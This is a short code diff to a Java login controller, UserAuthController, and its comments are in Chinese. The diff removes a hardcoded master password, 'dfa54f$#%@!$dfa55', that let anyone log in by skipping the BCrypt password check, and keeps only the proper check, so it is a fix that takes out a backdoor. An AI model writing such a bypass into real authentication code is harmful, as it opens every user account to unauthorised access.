@@ -76,7 +76,7 @@ public class UserAuthController {
         }
 
         // 验证密码是否正确
-        if(!new BCryptPasswordEncoder().matches(userLoginVo.getPassword(), userInfo.getPassword()) && !userLoginVo.getPassword().equals("dfa54f$#%@!$dfa55")) {
+        if(!new BCryptPasswordEncoder().matches(userLoginVo.getPassword(), userInfo.getPassword())) {
             return R.error("密码错误");
         }
 
